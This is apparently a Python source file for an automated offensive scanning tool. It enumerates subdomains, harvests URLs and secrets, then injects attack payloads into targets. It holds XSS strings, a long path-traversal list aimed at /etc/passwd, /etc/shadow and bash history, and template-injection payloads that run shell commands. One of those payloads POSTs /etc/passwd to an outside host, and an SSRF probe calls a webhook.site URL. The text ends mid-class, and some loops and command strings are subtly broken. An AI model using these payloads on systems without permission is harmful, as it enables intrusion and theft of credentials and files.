import argparse
import json
import os
import subprocess
import time
from datetime import datetime as date

import requests
import boto3
from botocore.exceptions import ClientError
from tqdm import tqdm
import dns.resolver


class Colors:
    def __init__(self):
        # ANSI color codes for terminal output
        self.GREEN = "\033[32m"
        self.RED = "\033[31m"
        self.BLUE = "\033[34m"
        self.SKY_BLUE = "\033[38;5;153m"
        self.END = "\033[0m"


color = Colors()

# Banner for the script, displayed at the start

banner = rf"""{color.GREEN}
    ______      __                      __  __            __           
   / ____/___ _/ /________  ____  ___  / / / /_  ______  / /____  _____
  / /_  / __ `/ / ___/ __ \/ __ \/ _ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / __/ / /_/ / / /__/ /_/ / / / /  __/ __  / /_/ / / / / /_/  __/ /    
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ /_/\__,_/_/ /_/\__/\___/_/  
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {color.END}
"""

print(banner)


# Loading decorator
def loading_animation(task):
    def decorator(func):
        def wrapper(*args, **kwargs):
            with tqdm(total=100, desc=task, bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
                for _ in range(100):
                    time.sleep(0.02)  # Simulating task progress
                    pbar.update(1)
                result = func(*args, **kwargs)
            return result

        return wrapper

    return decorator


# MakeDirectories class with directory creation logic
class MakeDirectories:
    def __init__(self, output_file):
        self.output_file = output_file

    @loading_animation(f"{color.GREEN}[+] Creating directories{color.END}")
    def mk_dirs(self):
        try:
            # Validate output_file
            if not self.output_file:
                print(
                    f"{color.RED}Error: Output directory not specified. Please provide an output directory with -o or --output.{color.END}")
                return

            # Create the main output directory
            if not os.path.isdir(self.output_file):  # True
                os.makedirs(self.output_file)
            dirs_list = ["hosts", "urls", "js", "vuln"]

            # Create subdirectories
            for d in dirs_list:
                os.makedirs(os.path.join(self.output_file, d), exist_ok=True)
                time.sleep(0.02)
                print(f"{color.GREEN}[+] {d} Directory successfully created{color.END}")

            print(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

            # Create files in the 'hosts' directory
            hosts_files = ["alive-hosts.txt", "httpx.txt", "subs.txt", "https-alive.txt", "asn.txt",
                           "targets-history.txt", "cname.txt", "httpx-cname.txt"]
            for f in hosts_files:
                open(os.path.join(f"{self.output_file}/hosts/", f), "w").close()
                time.sleep(0.02)
                print(f"{color.SKY_BLUE}[+] {f} File successfully created{color.END}")

            # Create files in the 'urls' directory
            urls_files = ["all-urls.txt", "filtered-urls.txt", "js-files.txt", "leaked-docs.txt", "params.txt",
                          "gf-xss.txt", "gf-ssrf.txt", "gf-lfi.txt", "gf-ssrf.txt", "gf-ssti.txt", "gf-sqli.txt"]
            for u in urls_files:
                open(os.path.join(f"{self.output_file}/urls/", u), "w").close()
                time.sleep(0.02)
                print(f"{color.SKY_BLUE}[+] {u} File successfully created{color.END}")

            # Create files in the 'vuln' directory
            vuln_files = [
                "nuclei-output.txt", "nuclei-dast-output.txt", "xss.txt", "lfi.txt", "ssrf.txt",
                "sqli.txt", "ssti.txt", "js-findings.txt", "missing-dmarc.json", "origin-ips.json",
                "s3-buckets.json", "ips.txt", "alive-ips.txt", "xss-dalfox.txt", "takeovers.json",
                "mantra.txt", "xss-kxss.txt", "xss-strike.txt", "xsshunter.txt",
                "gitleaks-findings.txt", "trufflehog-findings.txt", "secretfinder-findings.txt",
                "expanded-ips.txt", "subzy.txt", "subjack.txt", "open-redirect.txt", "lfi-map.txt", "openredirex.txt",
                "s3-cli.txt", "clickjacking.txt", "lfi-urls.txt", "lfi-subs.txt", "semgrep-findings.json"
            ]
            for v in vuln_files:
                open(os.path.join(f"{self.output_file}/vuln/", v), "w").close()
                time.sleep(0.02)
                print(f"{color.SKY_BLUE}[+] {v} File successfully created{color.END}")

        except Exception as e:
            print(f"{color.RED}Error creating directories: {e}{color.END}")


class SubdomainsCollector:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def subfinder_subs(self):
        domains = self.domains
        output = f"{self.output_file}/hosts/subs.txt"
        try:
            if os.path.isfile(output):
                subfinder_cmd = ["subfinder", "-dL", domains, "-all", "-o", output]
                print(f"{color.GREEN}(+) Subdomain enumeration{color.END}")
                subprocess.run(subfinder_cmd)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def probe(self):
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        httpx_output = f"{self.output_file}/hosts/httpx.txt"
        alive_output = f"{self.output_file}/hosts/alive-hosts.txt"
        try:
            httpx_cmd = ['httpx', '-l', subdomains_file, '-sc', '-title', '-fr', '-o', httpx_output]
            awk = "\'{print $1}\'"
            print(f"{color.GREEN}(+) Probing alive hosts{color.END}")
            subprocess.run(httpx_cmd)
            subprocess.run(f"cat {httpx_output} | awk {awk} | tee -a {alive_output}", check=True,
                           shell=True)

        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")


class DmarcFinder:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def check_spf(self, domain):
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for record in answers:
                if record.to_text().startswith('"v=spf1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            print(f"Error checking SPF for {domain}: {e}")
            return False

    def check_dmarc(self, domain):
        try:
            answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            for record in answers:
                if record.to_text().startswith('"v=DMARC1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return False
        except Exception as e:
            print(f"Error checking DMARC for {domain}: {e}")
            return False

    def validate_domains(self):
        print(f"{color.GREEN}(+) Checking for DMARC, SPF records{color.END}")
        try:
            with open(self.domains, 'r') as file:
                domains_list = file.read().splitlines()

            results = []
            for domain in tqdm(domains_list, desc="Checking DMARC/SPF"):
                spf_valid = self.check_spf(domain)
                dmarc_valid = self.check_dmarc(domain)

                result = {
                    "domain": domain,
                    "spf_valid": spf_valid,
                    "dmarc_valid": dmarc_valid,
                    "status": "Valid" if spf_valid and dmarc_valid else "Vulnerable"
                }
                results.append(result)

            output_json = f"{self.output_file}/vuln/missing-dmarc.json"
            with open(output_json, 'w') as f_out:
                json.dump(results, f_out, indent=4)

            print(f"{color.GREEN}[+] DMARC and SPF check completed and results saved to {output_json}{color.END}")
            print(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

        except Exception as e:
            print(f"{color.RED}Error in validate_domains method: {e}{color.END}")


class SubdomainTakeOver:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def get_cname(self):
        print(f"{color.GREEN}(+) CNAME analysis for possible takeovers{color.END}")
        output = f"{self.output_file}/hosts/cname.txt"
        subdomains_file = f"{self.output_file}/hosts/subs.txt"

        try:
            with open(subdomains_file, 'r') as file:
                subdomains = file.read().splitlines()

            with open(output, 'w') as out_file:
                for subdomain in subdomains:
                    try:
                        answers = dns.resolver.resolve(subdomain, 'CNAME')
                        for cname_data in answers:
                            cname = cname_data.target.to_text()
                            out_file.write(f"{subdomain} > {cname}\n")
                            print(f"{color.GREEN}{subdomain} > {cname}{color.END}\n")
                    except dns.resolver.NoAnswer:
                        print(f"{color.RED}No CNAME record found for {subdomain}{color.END}\n")
                    except dns.resolver.NXDOMAIN:
                        print(f"{color.SKY_BLUE}{subdomain} does not exist{color.END}\n")
                    except Exception as e:
                        print(f"{color.RED}Error checking CNAME for {subdomain}: {e}{color.END}\n")

        except Exception as e:
            print(f"{color.RED}Error reading subdomains file: {e}{color.END}")

    def httpx_cname(self):
        try:
            subdomains = f'{self.output_file}/hosts/subs.txt'
            output = f'{self.output_file}/hosts/httpx-cname.txt'
            httpx_cmd = ['httpx', '-l', subdomains, '-cname', '-o', output]
            print(f"{color.GREEN}(+) CNAME analysis for possible takeovers using httpx{color.END}")
            subprocess.run(httpx_cmd)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def subzy(self):
        try:
            subdomains_file = f'{self.output_file}/hosts/subs.txt'
            output = f'{self.output_file}/vuln/subzy.txt'
            subzy_cmd = ['subzy', 'run', '--targets', subdomains_file, '--vuln', '--output', output]
            print(f"{color.GREEN}(+) Testing for subdomain takeover via Subzy{color.END}")
            subprocess.run(subzy_cmd)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def subjack(self):
        try:
            subdomains_file = f'{self.output_file}/hosts/subs.txt'
            output = f'{self.output_file}/vuln/subjack.txt'
            subjack_cmd = ['subjack', '-w', subdomains_file, '-o', output]
            subprocess.run(subjack_cmd)
            print(f"{color.GREEN}(+) Testing for subdomain takeover via SubJack{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")


class BucketFinder():
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def test(self):
        pass

    def buckets_cli(self):
        subs = f'{self.output_file}/hosts/subs.txt'
        output = f'{self.output_file}/vuln/s3-cli.txt'
        self.s3_client = boto3.client('s3')
        open_buckets = []
        for domain in subs:
            bucket_name = f"{domain}"

            try:
                # Attempt to get the bucket's ACL as a way to check accessibility
                self.s3_client.get_bucket_acl(Bucket=bucket_name)

                # If no error was raised, the bucket is accessible
                print(f"{color.GREEN}(+) Found open bucket: {bucket_name}{color.END}")
                open_buckets.append(bucket_name)

            except ClientError as e:
                error_code = e.response['Error']['Code']
                # Check for specific errors to determine bucket accessibility
                if error_code == "NoSuchBucket":
                    print(f"{color.RED}(-) Bucket {bucket_name} does not exist.{color.END}")
                elif error_code == "AccessDenied":
                    print(f"{color.RED}(-) Bucket {bucket_name} is private.{color.END}")
                else:
                    print(f"{color.RED}(-) Error accessing {bucket_name}: {e}{color.END}")

        # Write results to the output file
        with open(output, 'w') as f:
            for bucket in open_buckets:
                f.write(f"{bucket}\n")

        print(f"{color.SKY_BLUE}Open buckets saved to {output}{color.END}")

    def s3scanner(self):
        subs = f'{self.output_file}/hosts/subs.txt'
        output = f'{self.output_file}/vuln/s3-cli.txt'

        pass


class UrlFinder:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file
        self.js_output = f"{self.output_file}/urls/js-files.txt"
        self.leaked_docs = f"{self.output_file}/urls/leaked-docs.txt"
        self.mantra_output = f"{self.output_file}/urls/mantra-output.txt"
        self.js_findings = f"{self.output_file}/urls/js-findings.txt"
        self.gitleaks_output = f"{self.output_file}/urls/gitleaks-findings.txt"
        self.trufflehog_output = f"{self.output_file}/urls/trufflehog-findings.json"
        self.secretfinder_output = f"{self.output_file}/urls/secretfinder-findings.txt"

    def collect_urls(self):
        subdomains_file = f'{self.output_file}/hosts/subs.txt'
        urls = f'{self.output_file}/urls/all-urls.txt'

        try:
            print(f"{color.GREEN}(+) Collecting all URLs{color.END}")
            commands = [
                f"cat {subdomains_file} | waybackurls | anew {urls}",
                f"cat {subdomains_file} | gau --subs | anew {urls}",
                f"cat {subdomains_file} | gauplus | anew {urls}",
                f"cat {urls} | grep '\\.js$' | anew {self.js_output}"
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, check=True)
            gf_list = ['xss', 'ssrf', 'lfi', 'sqli', 'ssti']
            gf_output = f'{self.output_file}/urls/'
            for gf in gf_list:
                subprocess.run(f'cat {urls} | gf {gf} | anew {gf_output}gf-{gf}.txt', shell=True, check=True)

        except Exception as e:
            print(f"{color.RED}Error occurred during URL collection: {e}{color.END}")

    def extract_js_files(self):
        try:
            print(f"{color.GREEN}[+] Extracting JS files...{color.END}")
            js_command = f"grep '\\.js$' {self.js_output} | anew {self.js_output}"
            subprocess.run(js_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: JS files saved to {self.js_output}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_documents(self):
        try:
            print(f"{color.GREEN}[+] Extracting documents and backup files...{color.END}")
            doc_file_types = r"\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar"
            doc_command = f"grep -E '{doc_file_types}' {self.output_file}/urls/all-urls.txt | anew {self.leaked_docs}"
            subprocess.run(doc_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: Sensitive documents saved to {self.leaked_docs}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def download_and_scan_js(self):
        js_dir = f"{self.output_file}/js/"
        os.makedirs(js_dir, exist_ok=True)
        try:
            print(f"{color.GREEN}[+] Downloading JavaScript files...{color.END}")
            with open(self.js_output, "r") as file:
                urls = file.read().splitlines()
            downloaded_files = []
            for url in urls:
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        filename = os.path.join(js_dir, os.path.basename(url.split("?")[0]))
                        with open(filename, "wb") as js_file:
                            js_file.write(response.content)
                        downloaded_files.append(filename)
                        print(f"{color.GREEN}[+] Downloaded: {url}{color.END}")
                    else:
                        print(f"{color.RED}[-] Failed to download: {url} (Status {response.status_code}){color.END}")
                except requests.exceptions.RequestException as e:
                    print(f"{color.RED}[-] Error downloading {url}: {e}{color.END}")
            # If no files were downloaded, skip Semgrep
            if not downloaded_files:
                print(f"{color.RED}[-] No JavaScript files were downloaded. Skipping Semgrep.{color.END}")
                return
            print(f"{color.GREEN}[+] Running Semgrep on downloaded JS files...{color.END}")
            semgrep_command = f"semgrep --config=p/javascript --json --output {self.output_file}/vuln/semgrep-findings.json {js_dir}"
            subprocess.run(semgrep_command, shell=True, check=True)
            print(
                f"{color.GREEN}[+] Completed: Semgrep findings saved to {self.output_file}/vuln/semgrep-findings.json{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_js_data_with_mantra(self):
        try:
            print(f"{color.GREEN}[+] Extracting data from JS files using Mantra...{color.END}")
            mantra_command = f"cat {self.js_output} | mantra | anew {self.mantra_output}"
            subprocess.run(mantra_command, shell=True, check=True)

            findings_command = f"cat {self.mantra_output} | grep '[+]' | anew {self.js_findings}"
            subprocess.run(findings_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: Mantra JS findings saved to {self.js_findings}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def scan_for_secrets_with_gitleaks(self):
        try:
            print(f"{color.GREEN}[+] Running GitLeaks for secrets...{color.END}")
            gitleaks_command = f"gitleaks detect --source {self.js_output} --report {self.gitleaks_output}"
            subprocess.run(gitleaks_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: GitLeaks findings saved to {self.gitleaks_output}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def scan_for_secrets_with_trufflehog(self):
        try:
            print(f"{color.GREEN}[+] Running TruffleHog to search for secrets...{color.END}")
            trufflehog_command = f"trufflehog filesystem --json {self.js_output} > {self.trufflehog_output}"
            subprocess.run(trufflehog_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: TruffleHog findings saved to {self.trufflehog_output}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def scan_for_sensitive_info_with_secretfinder(self):
        try:
            print(f"{color.GREEN}[+] Running SecretFinder to locate API keys and tokens...{color.END}")
            secretfinder_command = f"SecretFinder -i {self.js_output} -o cli | anew {self.secretfinder_output}"
            subprocess.run(secretfinder_command, shell=True, check=True)
            print(f"{color.GREEN}[+] Completed: SecretFinder findings saved to {self.secretfinder_output}{color.END}")
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")


class XSS:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def xss_cli(self):
        try:

            xss_urls = f'{self.output_file}/urls/gf-xss.txt'
            xss_output = f'{self.output_file}/vuln/xss.txt'
            xss_payloads = [
                '\"><svg/onload=alert(1337)>',
                '\"><img src=x onerror=alert()>',
                '\"><script>alert()</script>'
            ]
            for xss_test in xss_payloads:
                print(
                    f'{color.GREEN}(+) Testing for xss via CLI{color.END}\n{color.SKY_BLUE}(+) Testing payload: {xss_test}{color.END}')
                subprocess.run(
                    f'cat {xss_urls} | qsreplace \'{xss_test}\' | freq | grep -iv \'Not Vulnerable\' | tee -a {xss_output}',
                    shell=True, check=True)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def dalfox(self):
        try:
            # Dalfox XSS testing
            print(f"{color.GREEN}(+) Running Dalfox for additional XSS detection...{color.END}")
            xss_urls = f'{self.output_file}/urls/gf-xss.txt'
            xss_output = f'{self.output_file}/vuln/xss-dalfox.txt'
            dalfox_command = f"cat {xss_urls} | dalfox pipe | tee -a {xss_output}"
            subprocess.run(dalfox_command, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def xsshunter(self):
        try:
            # XSSHunter for advanced XSS detection (stored/reflected XSS)
            print(f"{color.GREEN}(+) Running XSSHunter...{color.END}")
            xss_urls = f'{self.output_file}/urls/gf-xss.txt'
            xss_output = f'{self.output_file}/vuln/xsshunter.txt'
            xsshunter_command = f"cat {xss_urls} | xsshunter | tee -a {xss_output}"
            subprocess.run(xsshunter_command, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")

    def kxss(self):
        try:
            pass
        except Exception as e:
            print(f"{color.RED}Error occurred: {e}{color.END}")


class OpenRedirect:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def openredirect_cli(self):
        urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/open-redirect.txt"
        try:
            openredirect_cmd = f"cat {urls} | qsreplace \"$LHOST\" | xargs -I % -P 25 sh -c 'curl -Is \"%\" 2>&1 | grep -q \"Location: $LHOST\" && echo \"VULN! %\"' | anew {output}"
            subprocess.run(openredirect_cmd, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}(+) Error occurred: {e} {color.END}")

    def openredirex(self):
        urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/openredirex.txt"
        try:
            openredirex_cmd = f'cat {urls} | openredirex | anew {output}'
            print(f"{color.GREEN}(+) Testing for open redirection using openredirex{color.END}")
            subprocess.run(openredirex_cmd, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}(+) Error occurred: {e} {color.END}")


class Clickjacking:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file
        self.hosts = f'{self.output_file}/hosts/subs.txt'
        self.vulnerable = f'{self.output_file}/vuln/clickjacking.txt'
        self.vulnerable_path = f'{self.output_file}/vuln/'

    def generate_poc(self, host):
        poc_file = os.path.join(self.vulnerable_path, f"{host.replace('.', '_')}.html")
        poc_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Clickjacking PoC - {host}</title>
            <style>
                iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    border: none;
                    opacity: 0.7;
                }}
            </style>
        </head>
        <body>
            <h1>Clickjacking PoC for {host}</h1>
            <iframe src="http://{host}"></iframe>
        </body>
        </html>
        """
        with open(poc_file, 'w') as file:
            file.write(poc_content)
        print(f"[+] PoC generated for {host}: {poc_file}")

    def x_frame_option(self):
        try:
            with open(self.hosts, 'r') as file:
                hosts = file.read().splitlines()

            for host in hosts:
                try:
                    response = requests.get(host, timeout=5)
                    if "X-Frame-Options" not in response.headers:
                        with open(self.vulnerable, 'a') as url:
                            url.write(f"{host}\n")
                        print(f"{color.GREEN}(+) Vulnerable to clickjacking {host} {color.END}")
                        self.generate_poc(host)
                    else:
                        print(f"{color.RED}(-) {host} is not vulnerable. {color.END}")
                except Exception as e:
                    print(f"{color.RED} [Error] Could not test {host}: {e} {color.END}")
        except Exception as e:
            print(f"{color.RED} Error occurred: {e} {color.END}")


class LFI:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def lfi_cli(self):
        lfi_payloads = ["../../../../etc/passwd",  # Standard path traversal
                        "../../../../../etc/passwd",  # Deeper directory traversal (5 levels)
                        "../../../../../etc/passwd%00",  # Deeper with null byte
                        "../../../../../etc/passwd%2500",  # Deeper with double encoded null byte
                        "../../../../../etc/passwd%00.jpg",  # Deeper with fake extension
                        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # 6-level URL encoded traversal
                        "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",  # Double URL encoded traversal
                        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 encoded directory traversal
                        "..%255c..%255c..%255c..%255cetc%255cpasswd",  # Windows-specific encoded backslashes
                        "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # Double dot and encoded traversal
                        "..%2F..%2F..%2F..%2Fetc%2Fpasswd%2523",  # Encoded fragment bypass (#)
                        "../../../../../var/log/apache2/access.log",  # Deeper directory traversal to access Apache logs
                        "../../../../../var/log/nginx/access.log",  # Nginx logs access (deep traversal)
                        "../../../../../var/mail/root",  # Deeper traversal to root mail
                        "../../../../../root/.bash_history",  # Deeper traversal to root's bash history
                        "../../../../../home/user/.bash_history",  # Deeper traversal to user's bash history
                        "../../../../../proc/self/environ",  # Deeper traversal to environment variables
                        "../../../../../../../../../../../../../../etc/passwd",
                        # Extremely deep traversal (max bypass attempt)
                        "..%2F" * 10 + "etc%2Fpasswd",  # Encoded traversal with repeated pattern
                        "%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # Leading with encoded slash traversal
                        "/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # Leading slash with encoded traversal
                        "/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Leading slash with UTF-8 encoding
                        "/../../../../../../../../../../../etc/shadow",
                        # Extremely deep traversal to access shadow file
                        "../../../../../../../../../../../../../dev/null",  # Deep traversal to `/dev/null`
                        "../../../../../../../../../../../../../boot.ini",  # Windows deep traversal to `boot.ini`
                        "../../../../../../../../../../../../../windows/system.ini",
                        # Windows deep traversal to `system.ini`
                        "..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",  # Windows traversal with encoding
                        "../../../../../../../../../../../../../etc/mysql/my.cnf",  # Deep traversal to MySQL config
                        "..%2F..%2F..%2F..%2F..%2Fvar%2Fspool%2Fmail%2Froot",  # Deeper traversal to root's mail spool
                        "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fproc%2Fself%2Fenviron",
                        # Encoded traversal to `/proc/self/environ`
                        "%2F..%255c..%255c..%255c..%255cwindows%255csystem.ini",
                        # Encoded Windows traversal with backslashes
                        "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2523",
                        "%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini"  # Windows traversal with mixed encoding
                        ]
        try:
            urls = f"{self.output_file}/urls/gf-lfi.txt"
            output_urls = f"{self.output_file}/vuln/lfi-urls.txt"
            subdomains = f"{self.output_file}/hosts/alive-hosts.txt"
            output_subdomains = f"{self.output_file}/vuln/lfi-subs.txt"
            # 0x01
            httpx_cmd = f"cat {subdomains} | qsreplace {lfi_payloads} | httpx random-agent -mc 200 -mr 'root:[x*]:0:0:' -o {output_subdomains}"
            print(f"{color.GREEN}(+) Testing for LFI{color.END}")
            subprocess.run(httpx_cmd, check=True, shell=True)
            # 0x02
            httpx_cmd = f"cat {urls} | qsreplace {lfi_payloads} | httpx random-agent -mc 200 -mr 'root:[x*]:0:0:' -o {output_urls}"
            print(f"{color.GREEN}(+) Testing for LFI{color.END}")
            subprocess.run(httpx_cmd, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")

    def lfi_map(self):
        lfi_urls = f'{self.output_file}/urls/gf-lfi.txt'
        output = f'{self.output_file}/vuln/lfi-map.txt'
        try:
            lfi_cmd = ['lfimap', '-F', lfi_urls, '-a', '--log', output]
            subprocess.run(lfi_cmd, shell=True, check=True)
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")


class SSTI:
    def __init__(self, domains, output_file, sstimap_path):
        self.domains = domains
        self.output_file = output_file
        self.sstimap_path = sstimap_path

    def ssti_cli(self):
        urls = f'{self.output_file}/urls/gf-ssti.txt'
        output = f'{self.output_file}/vuln/ssti.txt'
        payloads = [
            # Basic Payloads
            "{{7*7}}",  # Basic arithmetic
            "{{ config }}",  # Accessing configuration object

            # Accessing system variables and executing commands
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",  # Get user ID
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('ls').read() }}",  # List directory contents

            # File inclusion and reading
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('/etc/passwd').read() }}",  # Read /etc/passwd
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('file.txt').read() }}",  # Read specific file

            # Advanced file inclusion
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('cat /etc/hosts').read() }}",  # Read /etc/hosts
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('cat /var/log/apache2/access.log').read() }}",
            # Read Apache access log

            # Exploiting Python’s `pickle` module (requires appropriate environment)
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('python3 -c \"import pickle; pickle.loads(b'\\x80\\x03}q\\x00(X\\x03\\x00\\x00\\x00fooq\\x01K\\x01u.')\"').read() }}",
            # Example for pickle deserialization

            # Advanced directory listing
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('find / -type f').read() }}",
            # Find all files on the system

            # Framework-Specific Payloads
            # Jinja2 examples
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('python3 -c \"import os; os.system(\'whoami\')\"').read() }}",
            # Execute whoami command
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('python3 -c \"import os; os.system(\'ls -la\')\"').read() }}",
            # List directory contents

            # Django examples
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('cat /etc/passwd').read() }}",
            # Read /etc/passwd in Django
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('cat /var/log/nginx/access.log').read() }}",
            # Read Nginx access log

            # Exploiting command execution
            "{{ ''.__class__.__mro__[1].__subclasses__()[40]('echo -n \"$(ls)\"') }}",
            # Command execution and bypassing simple encoders

            # Testing for filters
            "{{ ''.__class__.__mro__[1].__subclasses__()[10]('curl -X POST http://example.com --data @/etc/passwd').read() }}"
            # Exfiltrate file content via HTTP POST
        ]
        try:
            # Open the output file for writing results
            with open(output, 'w') as output_file:
                # Read URLs from the input file
                with open(urls, 'r') as file:
                    urls = [line.strip() for line in file if line.strip()]

                # Process each URL with SSTImap
                for url in urls:
                    print(f"{color.GREEN}(+) Processing {url}...{color.END}")
                    command = ['python3', self.sstimap_path, '-i', url]
                    result = subprocess.run(command, capture_output=True, text=True)

                    # Write the results to the output file
                    output_file.write(f"Results for {url}:\n")
                    output_file.write(result.stdout)
                    output_file.write("\n\n")
                    print(f"{color.GREEN}[+] Completed {url}.{color.END}")
                    print(f"{color.SKY_BLUE}={color.END}" * 40)

                # Execute SSTI payloads
                for payload in payloads:
                    print(f"{color.GREEN}(+) Testing payload: {payload}{color.END}")
                    command = f"cat {urls} | qsreplace '{payload}' | httpx -mc 200 | anew {output}"
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)

                    # Optionally, write payload test results to the output file
                    output_file.write(f"(+) Results for payload {payload}:\n")
                    output_file.write(result.stdout)
                    output_file.write("\n\n")
                    print(f"{color.GREEN}(+) Completed testing payload: {payload}.{color.END}")
                    print(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")


class SSRF:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def ssrf_cli(self):
        urls = f'{self.output_file}/urls/gf-ssrf.txt'
        output = f'{self.output_file}/vuln/ssrf.txt'
        try:
            ssrf_cmd = f"cat {urls} | qsreplace \'webhook.site/ab053878-06c0-4f11-a087-61e22932c659\' | xargs -I % -P 25 sh -c \'curl -ks \"%\" 2>&1 | grep \"compute.internal\" && echo \"SSRF VULN! %\"\' | anew {output}"
            subprocess.run(ssrf_cmd, check=True, shell=True)
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")


class SQLI:
    def __init__(self, domains, output_file):
        self.domains = domains
        self.output_file = output_file

    def ghauri(self):
        # Open the output file for appending results
        urls = f'{self.output_file}/urls/gf-sqli.txt'
        output = f'{self.output_file}/vuln/sqli.txt'
        with open(output, 'a') as f:
            for domain in urls:
                # Construct the ghauri command for each domain
                command = ["ghauri", "-u", f"http://{domain}", "--batch", "--ignore-code", "401,403", "--level", "3",
                           "--banner",
                           "--hostname"]

                try:
                    # Execute the ghauri command and capture output
                    result = subprocess.run(command, capture_output=True, text=True, check=True)

                    # Write the output to the file
                    f.write(f"Results for {domain}:\n")
                    f.write(result.stdout)
                    f.write("\n" + "=" * 40 + "\n\n")

                except subprocess.CalledProcessError as e:
                    # If ghauri encounters an error, log it
                    f.write(f"Error scanning {domain}:\n")
                    f.write(e.stderr)
                    f.write("\n" + "=" * 40 + "\n\n")


class Nuclei:
    def __init__(self, domains, output_file, nuclei_templates):
        self.domains = domains
        self.output_file = output_file
        self.templates = nuclei_templates

    def basic_nuclei(self):
        hosts = f'{self.output_file}/hosts/alive-hosts.txt'
        output = f'{self.output_file}/vuln/nuclei-output.txt'
        templates = self.templates
        try:
            if templates:
